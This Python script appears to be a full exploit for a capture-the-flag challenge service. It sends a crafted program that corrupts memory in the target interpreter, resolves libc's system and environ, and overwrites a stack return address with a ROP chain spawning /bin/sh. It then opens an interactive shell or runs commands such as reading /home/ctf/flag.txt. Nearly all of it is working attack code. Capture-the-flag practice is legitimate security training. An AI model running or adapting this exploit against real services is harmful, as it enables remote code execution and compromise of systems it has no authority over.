#!/usr/bin/env python3
import argparse
import re
import socket
import sys
import threading
import time
from typing import Optional

PROGRAM = r'''
string s="AAAAAAAA";
string t="BBBBBBBB";
string c="CCCCCCCC";
int n=0;
int o=0;
int v=0;
int b=0;
int h=0;
int d=0;
int p=0;
int z=0;
int ix(){ if(n==0){ n=1; return 0; } return o; }
int rm(){ s=t; c=t; return v; }
int am(){ s=t; h=b; return v; }
int ub(int x){ int y=c[x]; if(y<0){ return y+256; } return y; }
int rr(int x){ return ub(x)+(ub(x+1)<<8)+(ub(x+2)<<16)+(ub(x+3)<<24)+(ub(x+4)<<32)+(ub(x+5)<<40)+(ub(x+6)<<48)+(ub(x+7)<<56); }
int wb(int a,int x){ b=a; v=x; o=0; n=0; s[ix()]=am(); return 0; }
int wq(int a,int x){ z=wb(a,x&255); z=wb(a+1,(x>>8)&255); z=wb(a+2,(x>>16)&255); z=wb(a+3,(x>>24)&255); z=wb(a+4,(x>>32)&255); z=wb(a+5,(x>>40)&255); z=wb(a+6,(x>>48)&255); z=wb(a+7,(x>>56)&255); return 0; }
int pt(int a){ z=wq(d-16,a); z=wq(d-8,65535); return 0; }
int rq(int a){ z=pt(a); return ub(0)+(ub(1)<<8)+(ub(2)<<16)+(ub(3)<<24)+(ub(4)<<32)+(ub(5)<<40)+(ub(6)<<48)+(ub(7)<<56); }
int rd(int a){ z=pt(a); return ub(0)+(ub(1)<<8)+(ub(2)<<16)+(ub(3)<<24); }
int dy(int a,int g){ int x=0; while(1){ x=rq(a); if(x==0){ return 0; } if(x==g){ return rq(a+8); } a=a+16; } return 0; }
int ml(int a){ int i=0; while(i<120){ z=pt(a+i); if(c[0]==108 && c[1]==105 && c[2]==98 && c[3]==99 && c[4]==46 && c[5]==115 && c[6]==111 && c[7]==46 && c[8]==54){ return 1; } if(c[0]==0){ return 0; } i=i+1; } return 0; }
int fl(int m){ while(m!=0){ if(ml(rq(m+8))==1){ return m; } m=rq(m+24); } return 0; }
int mt(int a,int y){ z=pt(a); if(y==1){ if(c[0]==115 && c[1]==121 && c[2]==115 && c[3]==116 && c[4]==101 && c[5]==109 && c[6]==0){ return 1; } } if(y==2){ if(c[0]==101 && c[1]==110 && c[2]==118 && c[3]==105 && c[4]==114 && c[5]==111 && c[6]==110 && c[7]==0){ return 1; } } return 0; }
int gs(int lb,int ld,int y){ int g=dy(ld,1879047925); int nb=rd(g); int so=rd(g+4); int bs=rd(g+8); int st=dy(ld,5); int sy=dy(ld,6); int hs=485418122; if(y==2){ hs=1805901222; } int bk=g+16+bs*8; int bi=hs-(hs/nb)*nb; int i=rd(bk+bi*4); if(i<so){ return 0; } int ch=bk+nb*4+(i-so)*4; int hv=0; int na=0; while(1){ hv=rd(ch); if((hv|1)==(hs|1)){ na=st+rd(sy+i*24); if(mt(na,y)==1){ return lb+rq(sy+i*24+8); } } if((hv&1)!=0){ return 0; } i=i+1; ch=ch+4; } return 0; }
int sr(int e,int r){ int a=e-8; while(a>e-65536){ if(rq(a)==r){ return a; } a=a-8; } return 0; }
int pwn(){ o=-8; v=200; n=0; s[ix()]=rm(); d=rr(144)-160; p=rr(88)-1011136; if(p-(p/4096)*4096!=0){ d=rr(120)-24; p=rr(184)-1011136; } int rg=rq(p+1030904); int lm=fl(rq(rg+8)); int lb=rq(lm); int ld=rq(lm+16); int sy=gs(lb,ld,1); int en=gs(lb,ld,2); int ev=rq(en); int ra=sr(ev,p+247940); z=wb(d,47); z=wb(d+1,98); z=wb(d+2,105); z=wb(d+3,110); z=wb(d+4,47); z=wb(d+5,115); z=wb(d+6,104); z=wb(d+7,0); z=wq(ra,p+81946); z=wq(ra+8,p+139662); z=wq(ra+16,d); z=wq(ra+24,sy); return 0; }
pwn();
__EOF__
'''.lstrip()

FLAG_PATTERNS = [
    re.compile(rb"[A-Za-z0-9_\-]+\{[^}\r\n]{1,200}\}"),
    re.compile(rb"flag\{[^}\r\n]{1,200}\}", re.I),
]

class SocketIO:
    def __init__(self, host: str, port: int, timeout: float):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)

    def recv_until_prompt(self, timeout: float = 2.0) -> bytes:
        end = time.time() + timeout
        data = b""
        while time.time() < end:
            self.sock.settimeout(max(0.05, end - time.time()))
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if b"__EOF__" in data or b":" in data:
                break
        return data

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, data: bytes) -> None:
        self.sock.sendall(data + b"\n")

    def recvall(self, timeout: float = 6.0) -> bytes:
        end = time.time() + timeout
        data = b""
        while time.time() < end:
            self.sock.settimeout(max(0.05, end - time.time()))
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        return data

    def interactive(self) -> None:
        socket_interactive(self)

    def close(self) -> None:
        self.sock.close()


def log(msg: str) -> None:
    print(msg, file=sys.stderr, flush=True)


def connect(args):
    if args.local:
        try:
            from pwn import context, process
        except Exception as exc:
            raise SystemExit("--local requires pwntools to launch the process") from exc
        context.log_level = args.log_level
        return process([args.binary])

    try:
        from pwn import context, remote
        context.log_level = args.log_level
        return remote(args.host, args.port, timeout=args.timeout)
    except Exception:
        return SocketIO(args.host, args.port, args.timeout)


def recv_prompt(io, timeout: float = 2.0) -> bytes:
    if hasattr(io, "recvuntil"):
        try:
            return io.recvuntil(b"__EOF__):", timeout=timeout)
        except Exception:
            return b""
    return io.recv_until_prompt(timeout)


def recvall(io, timeout: float) -> bytes:
    if hasattr(io, "recvall"):
        try:
            return io.recvall(timeout=timeout)
        except TypeError:
            return io.recvall()
    return io.recvall(timeout)


def send(io, data: bytes) -> None:
    io.send(data)


def sendline(io, data: bytes) -> None:
    if hasattr(io, "sendline"):
        io.sendline(data)
    else:
        io.send(data + b"\n")


def extract_flag(data: bytes) -> Optional[bytes]:
    for pat in FLAG_PATTERNS:
        m = pat.search(data)
        if m:
            return m.group(0)
    return None


def socket_interactive(io: SocketIO) -> None:
    """Line-based interactive mode for environments without pwntools."""
    stop = threading.Event()
    io.sock.settimeout(0.2)

    def recv_loop() -> None:
        while not stop.is_set():
            try:
                chunk = io.sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()
        stop.set()

    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()

    try:
        while not stop.is_set():
            line = sys.stdin.buffer.readline()
            if not line:
                break
            try:
                io.sock.sendall(line)
            except OSError:
                break
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        try:
            io.close()
        except Exception:
            pass


def start_shell(io, args) -> None:
    payload = PROGRAM.encode("ascii")

    banner = recv_prompt(io, args.prompt_timeout)
    if banner and args.show_banner:
        sys.stdout.buffer.write(banner)
        if not banner.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
        sys.stdout.buffer.flush()

    log("[*] sending exploit program")
    send(io, payload)
    time.sleep(args.delay)

    if args.cmd is not None:
        log(f"[*] running one-shot command: {args.cmd!r}")
        sendline(io, args.cmd.encode())
        data = recvall(io, args.timeout)
        flag = extract_flag(data)
        if flag:
            print(flag.decode("latin-1", errors="replace"))
        else:
            sys.stdout.buffer.write(data)
            if data and not data.endswith(b"\n"):
                sys.stdout.buffer.write(b"\n")
        return

    if args.check_cmd:
        sendline(io, args.check_cmd.encode())
        time.sleep(0.1)

    log("[*] interactive shell opened. Try: id ; pwd ; ls -la")
    log("[*] Ctrl-D or Ctrl-C to exit")
    if hasattr(io, "interactive"):
        try:
            io.interactive()
            return
        except TypeError:
            io.interactive(prompt=b"")
            return
    socket_interactive(io)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Exploit service and keep an interactive /bin/sh shell"
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--prompt-timeout", type=float, default=2.0)
    ap.add_argument("--delay", type=float, default=0.35, help="delay after sending payload before shell input")
    ap.add_argument("--local", action="store_true", help="run a local chall_release process instead of TCP")
    ap.add_argument("--binary", default="./chall_release", help="binary path for --local")
    ap.add_argument(
        "--cmd",
        default=None,
        help="run one command then exit instead of interactive, e.g. --cmd 'cat /home/ctf/flag.txt; exit'",
    )
    ap.add_argument(
        "--check-cmd",
        default="echo '[+] shell ready'; id; pwd",
        help="command sent once before interactive mode; set to empty string to disable",
    )
    ap.add_argument("--show-banner", action="store_true", help="print challenge banner/prompt before exploiting")
    ap.add_argument("--log-level", default="error", help="pwntools log level")
    args = ap.parse_args()

    io = connect(args)
    start_shell(io, args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
